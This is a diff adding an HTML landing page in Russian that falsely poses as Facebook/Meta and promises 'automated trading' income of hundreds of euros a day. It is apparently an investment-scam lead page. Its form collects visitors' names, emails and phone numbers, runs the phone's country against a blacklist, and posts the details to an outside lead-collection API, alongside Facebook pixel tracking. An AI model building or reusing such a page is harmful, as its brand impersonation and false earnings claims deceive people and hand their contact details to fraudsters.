@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html translate="no">
+
+<head>
+  <meta name="facebook-domain-verification" content="" />
+  <meta name="google" content="notranslate" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  <meta name="description" content="Умная система от Facebook для простого заработка" />
+  <meta property="og:description" content="Умная система от Facebook для простого заработка" />
+  <title>Facebook</title>
+  <link rel="icon" type="image/svg+xml" href="./src/images/ico.svg">
+
+  <link rel="stylesheet" href="./src/css/style.css" />
+  <link rel="stylesheet" href="./src/css/form.css">
+  <!-- Facebook Pixel Code -->
+  <script>
+    !(function (f, b, e, v, n, t, s) {
+      if (f.fbq) return;
+      n = f.fbq = function () {
+        n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+      };
+      if (!f._fbq) f._fbq = n;
+      n.push = n;
+      n.loaded = !0;
+      n.version = "2.0";
+      n.queue = [];
+      t = b.createElement(e);
+      t.async = !0;
+      t.src = v;
+      s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s);
+    })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+    fbq("init", "1039024921470640");
+    fbq("track", "PageView");
+    let productId = new URLSearchParams(window.location.search).get('p1');
+    if (productId && productId !== null) {
+      fbq('track', 'ViewContent', { content_ids: [productId], content_type: 'product' });
+    }
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display: none;"
+      src="https://www.facebook.com/tr?id=1039024921470640&ev=PageView&noscript=1" />
+  </noscript>
+</head>
+
+<body class="no-scroll">
+  <img src="./src/images/intro-img.webp" alt="img" style="display: none;">
+  <!-- =-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=- -->
+  <div class="app">
+    <main class="main">
+      <section class="intro">
+        <div class="container">
+          <div class="intro-content">
+            <div class="intro-wrapper">
+              <div class="intro-text">
+                <h1 class="intro-title">
+                  Умная система от
+                  <span class="blue-accent">
+                    Facebook
+                  </span>
+                  для
+                  <span class="blue-accent">
+                    простого заработка
+                  </span>
+                </h1>
+                <p>
+                  Откройте для себя новый способ заработка
+                  <span class="blue-accent">
+                    от 300 евро
+                  </span>
+                  благодаря
+                  <span class="blue-accent">
+                    автоматической торговле
+                  </span>
+                  от Meta
+                </p>
+              </div>
+              <button class="reg-btn" onclick="regAction()">Регистрация</button>
+            </div>
+            <div class="intro-img">
+              <img src="./src/images/intro-img.webp" alt="intro-phone">
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="slider">
+        <div class="container">
+          <div class="slider-content">
+            <div class="slider-text">
+              <snap class="slider-value">200€ </snap>
+              в день
+            </div>
+            <div class="slider-container">
+              <input type="range" id="slider" class="slider-input" min="1" max="12" value="1" step="1">
+              <div class="slider-labels">
+                <div class="slider-label" data-label="1"></div>
+                <div class="slider-label" data-label="2"></div>
+                <div class="slider-label" data-label="3"></div>
+                <div class="slider-label" data-label="4"></div>
+                <div class="slider-label" data-label="5"></div>
+                <div class="slider-label" data-label="6"></div>
+                <div class="slider-label" data-label="7"></div>
+                <div class="slider-label" data-label="8"></div>
+                <div class="slider-label" data-label="9"></div>
+                <div class="slider-label" data-label="10"></div>
+                <div class="slider-label" data-label="11"></div>
+                <div class="slider-label" data-label="12"></div>
+              </div>
+            </div>
+            <p class="slider-subtitle">От того, сколько времени вы пользуетесь Facebook, зависит ваш заработок на
+              платформе в день</p>
+          </div>
+        </div>
+      </section>
+      <section class="about">
+        <div class="container">
+          <div class="about-content">
+            <h2 class="about-title">
+              Как работает
+              <span class="blue-accent">
+                система заработка?
+              </span>
+            </h2>
+            <div class="about-wrapper">
+              <div class="about-item">
+                <div class="about-img">
+                  <img src="./src/images/item-1.webp" alt="item">
+                </div>
+                <p>Пройдите регистрацию и получите доступ к платформе</p>
+              </div>
+              <div class="about-item">
+                <div class="about-img">
+                  <img src="./src/images/item-2.webp" alt="item">
+                </div>
+                <p>Включите вашу программу по заработку и начните получать прибыль с акций</p>
+              </div>
+              <div class="about-item">
+                <div class="about-img">
+                  <img src="./src/images/item-3.webp" alt="item">
+                </div>
+                <p>Зарабатывайте больше с каждым днем, проведенным на платформе Facebook</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="register">
+        <div class="container">
+          <div class="register-content">
+            <div class="register-wrapper">
+              <h2 class="register-title">
+                Ваш
+                <span class="blue-accent">
+                  заработок
+                </span>
+                на акциях
+                <span class="blue-accent">
+                  растет
+                </span>
+                с каждым днем на платформе
+                <span class="blue-accent">
+                  Facebook!
+                </span>
+              </h2>
+              <div class="register-list">
+                <div class="register-list-item">
+                  <h2>Простой интерфейс</h2>
+                  <p>Управлять своими капиталом теперь так же легко, как листать Facebook.</p>
+                </div>
+                <div class="register-list-item">
+                  <h2>Экономия времени</h2>
+                  <p>Система работает 24/7, чтобы вы могли сосредоточиться на своих делах.</p>
+                </div>
+                <div class="register-list-item">
+                  <h2>Полностью автоматизированный процесс</h2>
+                  <p>Система анализирует рынок, выбирает самые выгодные сделки и заключает их вместо вас.</p>
+                </div>
+              </div>
+              <div class="reg-btn" onclick="regAction()">Регистрация</div>
+            </div>
+            <div class="register-video">
+              <video src="https://content.jwplatform.com/videos/IeyJwBtT-HRp3oIiB.mp4" id="registerVideo" muted playsinline>
+              </video>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <section class="lead-form open">
+    <div class="shade">
+      <div class="lead-form-content">
+        <div class="lead-form-text">
+          <div class="lead-form-text-wrapper first-wrapper show-part">
+            <h2 class="lead-form-text-title">Проверьте на доступность заработка свой аккаунт</h2>
+          </div>
+          <div class="lead-form-text-wrapper second-wrapper">
+            <h2 class="lead-form-text-title">Поздравляем вы получаете доступ к заработку от 350€</h2>
+            <p class="blue-accent">Заполните форму с почтой и номером телефона чтобы получить первую прибыль уже сегодня
+            </p>
+          </div>
+        </div>
+        <form class="register-form" id="reg_form" name="reg_form">
+          <!--  -->
+          <div class="register-form__first show-part">
+            <div class="form-input-main">
+              <label class="form-label" for="first_name">Имя</label>
+              <input type="text" class="form-input" name="first_name" placeholder="Имя" required />
+            </div>
+            <div class="form-input-main">
+              <label class="form-label" for="last_name">Фамилия</label>
+              <input type="text" class="form-input" name="last_name" placeholder="Фамилия" required />
+            </div>
+          </div>
+          <!--  -->
+          <div class="register-form__second">
+            <div class="form-input-main">
+              <label class="form-label" for="email">E-mail</label>
+              <input name="email" placeholder="E-mail" required type="email" />
+            </div>
+            <div class="form-input-main">
+              <label class="form-label" for="phone">Номер телефона</label>
+              <input type="hidden" name="phonePrefix" value="44" />
+              <input type="tel" class="form-input" name="phone" placeholder="Phone Number" required />
+            </div>
+          </div>
+          <button class="lead-form-action show-part" type="button" onclick="leadModalAction()">проверить</button>
+          <button name="submitBtn" type="submit">Регистрация</button>
+        </form>
+      </div>
+    </div>
+  </section>
+  <!-- =-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=- -->
+
+  <!-- form-preset ---------------->
+
+
+  <div class="loader">
+    <div class="loader-element"></div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="./src/js/main.js"></script>
+
+  <!-- intlTelInput -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/css/intlTelInput.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/intlTelInput.min.js"></script>
+
+  <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
+    <div class="modal-dialog_phone">
+      <div class="modal-content_phone">
+        <div class="modal-header_phone">
+          <h5 class="modal-title_phone">
+            Teléfono no válido
+          </h5>
+          <button type="button" class="close-button_phone" id="close-button_phone">×</button>
+        </div>
+        <div class="modal-body_phone">
+          ¡Perdona! El programa no es compatible con su región. Introduzca su número de socio europeo
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="./src/js/ModalPhoneError.js"></script>
+
+  <!-- script-for-form ---------------------->
+  <script>
+    const LANDING_LANG = 'RU';
+
+    const formJsonData = '';
+    const formHeaderData = '';
+    const formFooterData = '';
+
+    const formDiv = document.querySelectorAll('.register-form');
+
+    let errors = {
+      'AR': [
+        { errorPlaceholder: 'أدخل أسمك', },
+        { errorPlaceholder: 'أدخل اسمك الأخير', },
+        { errorPlaceholder: 'أدخل رقمك', },
+        { errorPlaceholder: 'أدخل بريدك الإلكتروني', },
+      ],
+      'RU': [
+        { errorPlaceholder: 'Введите Ваше Имя', },
+        { errorPlaceholder: 'Введите Вашу Фамилию', },
+        { errorPlaceholder: 'Введите Ваш Номер', },
+        { errorPlaceholder: 'Введите Ваш Email', },
+      ],
+      'EN': [
+        { errorPlaceholder: 'Enter Correct First Name', },
+        { errorPlaceholder: 'Enter Correct Last Name', },
+        { errorPlaceholder: 'Enter Correct Phone', },
+        { errorPlaceholder: 'Enter Correct Email', },
+      ],
+      'PL': [
+        { errorPlaceholder: 'Wprowadź poprawne imię', },
+        { errorPlaceholder: 'Wpisz poprawne nazwisko', },
+        { errorPlaceholder: 'Wprowadź prawidłowy numer telefonu', },
+        { errorPlaceholder: 'Wpisz poprawny adres e-mail', },
+      ],
+      'DE': [
+        { errorPlaceholder: 'Korrekten Vornamen eingeben', },
+        { errorPlaceholder: 'Korrekten Nachnamen eingeben', },
+        { errorPlaceholder: 'Geben Sie das richtige Telefon ein', },
+        { errorPlaceholder: 'Geben Sie die richtige E-Mail-Adresse ein', },
+      ],
+      'ES': [
+        { errorPlaceholder: 'Ingrese el nombre correcto', },
+        { errorPlaceholder: 'Ingrese el apellido correcto', },
+        { errorPlaceholder: 'Ingrese el teléfono correcto', },
+        { errorPlaceholder: 'Ingrese el correo electrónico correcto', },
+      ],
+      'CZ': [
+        { errorPlaceholder: 'Zadejte správné křestní jméno', },
+        { errorPlaceholder: 'Zadejte správné příjmení', },
+        { errorPlaceholder: 'Zadejte správný telefon', },
+        { errorPlaceholder: 'Zadejte správný e-mail', },
+      ],
+      'TR': [
+        { errorPlaceholder: "Doğru Adı Girin" },
+        { errorPlaceholder: "Doğru Soyadı Girin" },
+        { errorPlaceholder: "Doğru Telefonu Girin" },
+        { errorPlaceholder: "Doğru E-postayı Girin" }
+      ],
+      'IT': [
+        { errorPlaceholder: 'Inserisci il nome corretto', },
+        { errorPlaceholder: 'Inserisci il cognome corretto', },
+        { errorPlaceholder: 'Immettere il numero di telefono corretto', },
+        { errorPlaceholder: `Inserisci l'e-mail corretta`, },
+      ],
+      'JP': [
+        { errorPlaceholder: 'お名前を入力してください', },
+        { errorPlaceholder: '苗字を入力してください ', },
+        { errorPlaceholder: '電話番号を入力してください', },
+        { errorPlaceholder: 'メールアドレスを入力してください', },
+      ]
+    }
+
+    errors = errors[LANDING_LANG]
+
+    const openModal = () => {
+      document.getElementById("modal_phone").classList.add("open_phone");
+      document.body.classList.add("modal-open_phone");
+    };
+
+    const closeModal = () => {
+      document.getElementById("modal_phone").classList.remove("open_phone");
+      document.body.classList.remove("modal-open_phone");
+    };
+
+    document.getElementById("close-button_phone").addEventListener("click", closeModal);
+
+    $(document).ready(function () {
+      let phonePrefix = "44";
+
+      $.ajax({
+        url: 'https://getyourapi.site/api/geolocation',
+        dataType: "json",
+        success: function (result) {
+          $('input[name="phone"]').each(function (input) {
+            let iti = intlTelInput(this, {
+              ...result.data,
+              autoHideDialCode: "true",
+              customContainer: "phoneWrapper",
+              autoPlaceholder: "aggressive",
+              separateDialCode: "false",
+              utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/utils.min.js",
+            });
+            phonePrefix = iti.getSelectedCountryData().dialCode;
+            $(this).on("countrychange", function () {
+              phonePrefix = iti.getSelectedCountryData().dialCode;
+            });
+            $("select[name = nationality]").val(result.data.initialCountry.toUpperCase());
+            return iti;
+          });
+        },
+      });
+
+      function validateEmail(email) {
+        return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(String(email).toLowerCase());
+      }
+
+      function changInputHandler(e) {
+        if (e.target.value.length === 0) {
+          this.classList.remove("valid");
+          this.classList.add("error");
+          return;
+        }
+        this.classList.add("valid");
+        this.classList.remove("error");
+      }
+
+      function changEmailHandler(e) {
+        if (validateEmail(e.target.value) === false) {
+          this.classList.add("error");
+          this.classList.remove("valid");
+          return;
+        }
+        this.classList.add("valid");
+        this.classList.remove("error");
+      }
+
+      const { fbclid, p1 } = parseURLParams(location.href);
+
+      $(".form-input").keyup(changInputHandler);
+      $(".form-input").change(changInputHandler);
+      $("input[name = email]").keyup(changEmailHandler);
+      $("input[name = email]").change(changEmailHandler);
+
+      $("form.register-form").submit(function (e) {
+        e.preventDefault();
+
+        $(".loader").css("display", "block");
+        const form = $(this);
+        const first_name = form.find("input[name = first_name]");
+        const last_name = form.find("input[name = last_name]");
+        const nationality = form.find("select[name = nationality]")?.val();
+        const email = form.find("input[name = email]");
+        const phone = form.find("input[name = phone]");
+
+        let isError = false;
+        if (first_name.val() === "" || first_name.val().match(/[0-9]/) || first_name.val().trim() === "") {
+          first_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[0].errorPlaceholder);
+          isError = true;
+        }
+
+        if (last_name.val() === "" || last_name.val().match(/[0-9]/) || last_name.val().trim() === "") {
+          last_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[1].errorPlaceholder);
+          isError = true;
+        }
+
+        if (phone.val() === "" || phone.val().trim() === "" || isNaN(phone.val())) {
+          phone.addClass("error").removeClass('valid').val("").attr("placeholder", errors[2].errorPlaceholder);
+          isError = true;
+        }
+
+        if (validateEmail(email.val()) === false) {
+          email.addClass("error").val("").attr("placeholder", errors[3].errorPlaceholder);
+          isError = true;
+        }
+
+        if (isError === true) {
+          $(".loader").css("display", "none");
+          return;
+        }
+
+        const button = $("button[name=submitBtn]");
+        button.prop("disabled", true);
+
+        const checkNumber = new Promise((resolve, reject) => {
+          $.ajax({
+            url: `https://getyourapi.site/api/phone/validate`,
+            type: "post",
+            contentType: "application/json",
+            data: JSON.stringify({
+              phone: `${phonePrefix}${phone.val()}`,
+            }),
+            success: resolve,
+            error: reject,
+          });
+        });
+
+        const getBlacklist = new Promise((resolve, reject) => {
+          $.ajax({
+            url: "https://getyourapi.site/api/blacklist",
+            type: "get",
+            contentType: "application/json",
+            success: function (res) {
+              resolve(res);
+            },
+            error: function (error) {
+              reject(error);
+            },
+          });
+        });
+
+        Promise.all([checkNumber, getBlacklist])
+          .then(([checkNumber, blacklist]) => {
+            if (checkNumber.status === false) {
+              phone.addClass("error").removeClass("valid").val("").attr("placeholder", errors[2].errorPlaceholder);
+              $(".loader").css("display", "none");
+              throw new Error("check number error");
+            }
+
+            if (blacklist.status === false) {
+              $(".loader").css("display", "none");
+              throw new Error("get blacklist error");
+            }
+
+            if (blacklist.data.blacklist.includes(checkNumber.data.country_code.toLowerCase())) {
+              $(".loader").css("display", "none");
+              openModal();
+              setTimeout(closeModal, 5000);
+              throw new Error("forbidden country");
+            }
+            if (nationality && blacklist.data.blacklist.includes(nationality.toLowerCase())) {
+              window.location.href = "/success.html";
+              return;
+            }
+
+            $.ajax({
+              url: "https://getyourapi.site/api/leads",
+              type: "post",
+              contentType: "application/json",
+              data: JSON.stringify({
+                first_name: first_name.val(),
+                last_name: last_name.val(),
+                email: email.val(),
+                phone: phone.val(),
+                country: checkNumber.data.country_code,
+                nationality: nationality,
+                click_id: fbclid,
+              }),
+              dataType: "json",
+              success: function (res) {
+                if (res.status === true) {
+                  fbq("track", "Lead");
+                  fbq("track", "CompleteRegistration");
+                  if (p1) {
+                    fbq('track', 'AddToCart', { content_ids: [p1], content_type: 'product' });
+                  }
+                  switch (res.data.proceedWith) {
+                    case "success":
+                      window.location.href = "./success.html" + '?lang=' + LANDING_LANG;
+                      break;
+                    case "exist":
+                      window.location.href = "./error.html" + '?lang=' + LANDING_LANG;
+                      break;
+                    case "redirect":
+                      window.location.href = res.data.redirectUrl;
+                      break;
+                    default:
+                      window.location.href = "./success.html" + '?lang=' + LANDING_LANG;
+                  }
+                  console.log("click");
+                } else {
+                  alert("Error! API Error");
+                  $(".loader").css("display", "none");
+                  button.prop("disabled", false);
+                }
+              },
+              error: function (error) {
+                button.prop("disabled", false);
+                $(".loader").css("display", "none");
+                console.error(error);
+              },
+            });
+          })
+          .catch((error) => {
+            button.prop("disabled", false);
+            $(".loader").css("display", "none");
+            console.error(error);
+          });
+      });
+    });
+
+    function parseURLParams(url) {
+      var queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+      var obj = {};
+      if (queryString) {
+        queryString = queryString.split("#")[0];
+        var arr = queryString.split("&");
+        for (var i = 0; i < arr.length; i++) {
+          var a = arr[i].split("=");
+          var paramName = a[0];
+          var paramValue = typeof a[1] === "undefined" ? true : a[1];
+          if (paramName.match(/\[(\d+)?\]$/)) {
+            var key = paramName.replace(/\[(\d+)?\]/, "");
+            if (!obj[key]) obj[key] = [];
+            if (paramName.match(/\[\d+\]$/)) {
+              var index = /\[(\d+)\]/.exec(paramName)[1];
+              obj[key][index] = paramValue;
+            } else {
+              obj[key].push(paramValue);
+            }
+          } else {
+            if (!obj[paramName]) {
+              obj[paramName] = paramValue;
+            } else if (obj[paramName] && typeof obj[paramName] === "string") {
+              obj[paramName] = [obj[paramName]];
+              obj[paramName].push(paramValue);
+            } else {
+              obj[paramName].push(paramValue);
+            }
+          }
+        }
+      }
+
+      return obj;
+    }
+  </script>
+</body>
+
+</html>
